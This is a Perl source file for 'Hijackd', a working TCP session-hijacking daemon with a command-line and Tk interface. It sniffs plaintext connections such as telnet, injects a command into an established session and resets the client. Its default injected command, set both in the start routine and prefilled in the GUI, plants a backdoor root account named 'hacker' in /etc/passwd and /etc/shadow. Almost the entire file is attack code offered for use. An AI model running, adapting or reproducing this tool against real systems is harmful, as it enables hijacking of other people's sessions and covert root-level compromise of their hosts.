#!/usr/bin/perl

eval 'exec /usr/bin/perl  -S $0 ${1+"$@"}'
    if 0; # not running under some shell
#
# Hijackd - Automatic Hijacking Daemon for plain protocols
# Version 0.4
#
# Programmed by Bastian Ballmann [ Crazydj@chaostal.de ]
# http://www.crazydj.de
#
# Last Update: 24.07.2004
# 
# This program is free software; you can redistribute 
# it and/or modify it under the terms of the 
# GNU General Public License version 2 as published 
# by the Free Software Foundation.
#
# This program is distributed in the hope that it will 
# be useful, but WITHOUT ANY WARRANTY; without even 
# the implied warranty of MERCHANTABILITY or FITNESS 
# FOR A PARTICULAR PURPOSE. 
# See the GNU General Public License for more details. 


# Are you r00t?
die "You must be root!\n" if($> != 0);


###[ Loading modules ]###

use path::hijack;    # Hijacking Stuff
use path::config;    # Configuration Stuff
use Getopt::Std;     # Parsing parameter
use Net::Pcap;       # Packet capturing
use IO::Select;      # Watching pipes
use strict;          # Be strict;

# Do you have X and Tk?
BEGIN 
{
    eval{ require Tk; };              
    import Tk unless $@;
};


###[ Signal handlers ]###

# Kill child process on INT or KILL signal
$SIG{INT} = \&exit_prog;
$SIG{KILL} = \&exit_prog;


###[ Global variables ]###

# My hijacked connection
my $connection;

# Pcap expression
my $pcap;

# Watching pipe
my $watcher = new IO::Select;

# Pipes and pid of the child process
my ($read,$write,$pid);

# Parameter hash
my %args;

# Create config object
my $cfg = path::config->new();

# Global Tk objects
my ($top, $result,$target_entry, $device_entry, $connection_entry, $port_entry, $infiltration_string);


###[ MAIN PART ]###

# Need help?
usage() if($ARGV[0] eq "--help");

# Start GUI version?
if($ARGV[0] eq "--gui")
{
    draw_gui();
}
else
{
    # Parsing parameter
    getopts('h:c:p:i:S:',\%args);
    &start(%args);
}



###[ Subroutines ]###

# Start the hijackd
sub start
{
    # About this tool
    about();

    # Check config
    exit(1) if($cfg->check(%args) == 1);

    # Default infiltrate string
    # Add the user hacker (pass hacker) to /etc/passwd
    if($args{'S'} eq "")
    {
	$args{'S'} = "echo 'hacker:x:0:0::/:/bin/sh' >> /etc/passwd && echo 'hacker:\$1\$u70t2mzi\$v8VeFsr3uFwbl772vjb/a0:12019:0:99999:7:::' >> /etc/shadow\n";
    }

    # Default port is 23
    if($args{p} eq "")
    {
	if($ARGV[0] eq "--gui")
	{
	    $result->insert('end',"You have not specified a port.\nI will use 23 per default...\n");
	    $result->see('end');
	    $top->update;
	}
	else
	{
	    print "You have not specified a port.\nI will use 23 per default...\n";
	}

	$cfg->set_port(23);
    }

    # Create the pcap expression
    $pcap = $cfg->pcap();
    $pcap .= "tcp";

    if($ARGV[0] eq "--gui")
    {
	$result->insert('end',"Start sniffin $pcap on " . $cfg->get_device . "\n\n");
	$result->see('end');
	$top->update();
    }
    else
    {
	print "Start sniffin $pcap on " . $cfg->get_device . "\n\n";
    }

    # Create a child process
    ($read,$write,$pid) = mkchild();

    # Add the read pipe to the watcher list
    $watcher->add($read);

    # Start sniffin
    while(1)
    {
	$top->update if $ARGV[0] eq "--gui";

	# The child process has got something for us
	if($watcher->can_read(1))
	{
	    my $msg = pipe_read($read);

	    # Oh damn! There was an error!
	    if($msg =~ /^\[err\]\s/)
	    {
		show_error($');
		last;
	    }

	    # Hehe. The kid has caught a packet
	    else
	    {
		check($msg);
	    }
	}
    }
}


# Child process sniffs traffic and returns the sniffed
# packets to the father process
sub mkchild
{
    my $pid;

    # Create pipes
    pipe(my $father_read, my $father_write) or die $!;
    pipe(my $child_read, my $child_write) or die $!;

    # Fork child process
    $pid = fork();
    die "Cannot fork()!\n$!\n" unless defined $pid;

    # Father process
    if($pid != 0)
    {
	# Close unused pipes of the father process
	close($father_read); close($child_write);
	return($child_read,$father_write,$pid);
    }

    # Child process
    else
    {
	# Close unused pipes of the child process
	close($father_write); close($child_read);

	# Create a pipe watcher
	my $child_watcher = new IO::Select;

	# Add the read pipe of the father to the watcher list
	$child_watcher->add($father_read);

	# Error buffer
	my $errbuf;
	
	# Open network interface
	my $pcap_dev = Net::Pcap::open_live($cfg->get_device, 1024, 1, 1500, \$errbuf);

	if(defined $pcap_dev)
	{
	    # Compile and set the filter
	    my ($net, $mask, $filter);
	    Net::Pcap::lookupnet($cfg->get_device, \$net, \$mask, \$errbuf);
	    Net::Pcap::compile($pcap_dev,\$filter,$pcap,0,$mask);
	    Net::Pcap::setfilter($pcap_dev,$filter);

	    # Start sniffin
	    while(1)
	    {
		if($child_watcher->can_read(1))
		{
		    my $msg = pipe_read($father_read);
		    exit(0) if $msg eq "KILL";
		}
		
		my %header;
		my $packet = Net::Pcap::next($pcap_dev, \%header);
		pipe_write($child_write,$packet);
		
	    }
	}
	else
	{
	    pipe_write($child_write,"[err] Error while opening device ".$cfg->get_device."!\n$errbuf");
	    return;
	}

    }
}


# Write data into a pipe
# Parameter: Pipe, Message
sub pipe_write
{
    my ($pipe,$msg) = @_;
    my $bytes = sprintf("0x%08x",length($msg));
    my $send = 0;
    while($send < length($msg)+10) { $send += syswrite($pipe,$bytes.$msg,length($msg)+10,$send); }
}


# Read data out of a pipe
# Parameter: Pipe
sub pipe_read
{
    my $pipe = shift;
    my ($bytes,$buffer,$msg);

    while(1)
    {
	sysread($pipe,$buffer,10);
	$bytes = hex($buffer) if $buffer ne "";
	last if $bytes > 0;
    }

    $buffer = 0;
    while($buffer < $bytes) { $buffer += sysread($pipe,$msg,$bytes-$buffer); }
    return $msg;
}


# Check if the connection should be hijacked
# This function is called for every sniffed packet
sub check
{
    my $packet = shift;
    my $flag = 0;

    # Redraw GUI
    $top->update() if $ARGV[0] eq "--gui";

    # Is there a hijack object?
    unless(defined $connection)
    {
	$connection = path::hijack->new($packet);
	return;
    }

    # Was this connection hijacked before?
    # Than leave it alone!
    if($connection->hijacked($packet)) { return; }

    # Does this packet belong to "our" connection?
    unless($connection->check($packet)) { return; }

    # Is the connection established already?
    if($connection->is_established)
    {	
	# Are we interessted in one of the ports?
	map { hijack($packet,$_) } $cfg->get_port;
    }
}


# Hijack the connection
sub hijack
{
    my $packet = shift;
    my $port = shift;

    # Was the packet send by the server?
    if($connection->check_port($packet,$port,0))
    {
	# Register the packet
	$connection->stateful($packet,"server");
	
	# Can we hijack this connection?
	if($connection->is_hijackable)
	{
	    # Go get it!
	    $connection->infiltrate($args{'S'});
	    $connection->is_hijacked($packet);	    

	    my $output = "Hijacked " . $connection->{client_ip} . ":" . $connection->{client_port} . " --> " . $connection->{server_ip} . ":" . $connection->{server_port} . "  SEQ: " . $connection->{server_ack} . " Command: $args{'S'}\n";

	    if($ARGV[0] eq "--gui")
	    {
		$result->insert('end',"$output");
		$result->see('end');
		$top->update();
	    }
	    else
	    {
		print $output;
	    }

	    # Reset the clients connection to avoid ack storms
	    $connection->reset('rst','client');
	}
    }

    # The packet was send by the client
    elsif($connection->check_port($packet,0,$port))
    {
	$connection->stateful($packet,"client");
    }
}


# About this tool
sub about
{
    if($ARGV[0] eq "--gui")
    {
	$result->insert('end',"Hijackd -- Automatic hijacking daemon for plain protocols\n");
	$result->insert('end',"Version 0.4\n");
	$result->insert('end',"Programmed by Bastian Ballmann [ Crazydj\@chaostal.de ]\n\n");
	$result->see('end');
	$top->update();
    }
    else
    {
	print "Hijackd -- Automatic hijacking daemon for plain protocols\n";
	print "Version 0.4\n";
	print "Programmed by Bastian Ballmann [ Crazydj\@chaostal.de ]\n\n";
    }
}


# Print usage
sub usage 
{  
    about();
    print "Usage: $0 -h [host(s)] -p [port(s)] -c <connection> -i <device> -S <infiltrade-string>\n";
    print "Or use --gui to load the gui version.\n\n";
    exit(0);
}


# Kill the child process and exit the program
sub exit_prog
{
    if(defined $pid)
    {
	pipe_write($write,"KILL");
	waitpid($pid,'-1');
    }

    exit(0);
}


###[ The GUI code ]###

sub draw_gui
{
    # Main window
    $top = MainWindow->new(-background => 'black', -foreground => 'green', -borderwidth => 2);
    $top->title('Hijackd -- Automatic hijacking daemon for plain protocols');
    $top->option(add => '*background', 'black');
    $top->option(add => '*foreground', 'green');

    # Frames
    my $content = $top->Frame->pack(-side => 'top', -pady => 10, -padx => 10);
    my $configure = $top->Frame->pack(-side => 'top', -pady => 5, -padx => 10);
    my $left = $configure->Frame->pack(-side => 'left', -padx => 10);
    my $right = $configure->Frame->pack(-side => 'right', -padx => 10);
    my $toolbar = $top->Frame->pack(-side => 'bottom', -pady => 5, -padx => 10);
    my $result_frame = $top->Frame->pack(-side => 'bottom', -pady => 15, -padx => 10);

    # Labels
    $content->Label(-text => '[ Hijackd -- Automatic hijacking daemon for plain protocols ]',
		    -border => 0)->pack(-pady => 5);

    $content->Label(-text => '[ Programmed by Bastian Ballmann ]',
		    -border => 0)->pack(-pady => 5);


    # Configuration
    $left->Label(-text => 'Host:',
		 -border => 0)->pack(-pady => 10, -padx => 5);

    $target_entry = $right->Entry(-background => '#3C3C3C')->pack(-pady => 6);

    $left->Label(-text => 'Connection:',
		 -border => 0)->pack(-pady => 10, -padx => 5);

    $connection_entry = $right->Entry(-background => '#3C3C3C')->pack(-pady => 6);

    $left->Label(-text => 'Port:',
		 -border => 0)->pack(-pady => 10, -padx => 5);

    $port_entry = $right->Entry(-background => '#3C3C3C')->pack(-pady => 6);

    $left->Label(-text => 'Device:',
		 -border => 0)->pack(-pady => 10, -padx => 5);

    $device_entry = $right->Entry(-background => '#3C3C3C')->pack(-pady => 6);
    my $errbuf;
    $device_entry->insert(0,Net::Pcap::lookupdev(\$errbuf));

    $left->Label(-text => 'Infiltration String:',
		 -border => 0)->pack(-pady => 10, -padx => 5);

    $infiltration_string = $right->Entry(-background => '#3C3C3C')->pack(-pady => 6);

    $infiltration_string->insert(0,"echo 'hacker:x:0:0::/:/bin/sh' >> /etc/passwd && echo 'hacker:\$1\$u70t2mzi\$v8VeFsr3uFwbl772vjb/a0:12019:0:99999:7:::' >> /etc/shadow\n");

    # Toolbar
    $toolbar->Button(-text => 'Start hijackd',
		     -activebackground => 'black',
		     -activeforeground => 'red',
		     -borderwidth => 0,
		     -border => 0,
		     -command => \&getcfg)->pack(-side => 'left', -padx => 10);

    $toolbar->Button(-text => 'Stop hijackd',
		     -activebackground => 'black',
		     -activeforeground => 'red',
		     -borderwidth => 0,
		     -border => 0,
		     -command => \&exit_prog)->pack(-side => 'right', -padx => 10);

    # Output
    $result_frame->Label(-text => 'Output',
			 -border => 0)->pack(-side => 'top', -pady => 10);

    $result = $result_frame->Scrolled('Text',
				      -border => 2,
				      -width => 57,
				      -height => 10)->pack(-side => 'bottom', -pady => 5);
    $result->configure(-scrollbars => 'e');

    MainLoop();
}


# Read the configuration
sub getcfg
{
    my $tmp;

    $tmp = $target_entry->get;

    if(length($tmp) > 0)
    {
	if(path::config::check_ip($tmp) == 1)
	{
	    show_error("Bad address $tmp");
	    return;
	}
	else
	{
	    $args{'h'} = $tmp;
	}
    }

    $tmp = $connection_entry->get;

    if(length($tmp) > 0)
    {
	if(path::config::check_ip($tmp) == 1)
	{
	    show_error("Bad address $tmp");
	    return;
	}
	else
	{
	    $args{'c'} = $tmp;
	}
    }

    $tmp = $device_entry->get;
    $args{'i'} = $tmp;

    $tmp = $port_entry->get;
    $args{'p'} = $tmp if(length($tmp) > 0);

    $tmp = $infiltration_string->get;
    $args{'S'} = $tmp if(length($tmp) > 0);

    start(%args);
}



# Show Error Message
sub show_error
{
    my $msg =  shift;

    if($ARGV[0] eq "--gui")
    {
	my $error = $top->Toplevel;
	$error->title('Error');
	$error->option(add => '*background', 'black');
	$error->option(add => '*foreground', 'green');

	$error->Label(-text => $msg,
		      -border => '0')->pack(-padx => 10, -pady => 10, -side => 'top');
	
	$error->Button(-text => 'OK',
		       -activebackground => 'black',
		       -activeforeground => 'red',
		       -border => 0,
		       -command => sub { $error->destroy })->pack(-pady => 5, -side => 'bottom');
    }
    else
    {
	print "$msg\n";
    }
}
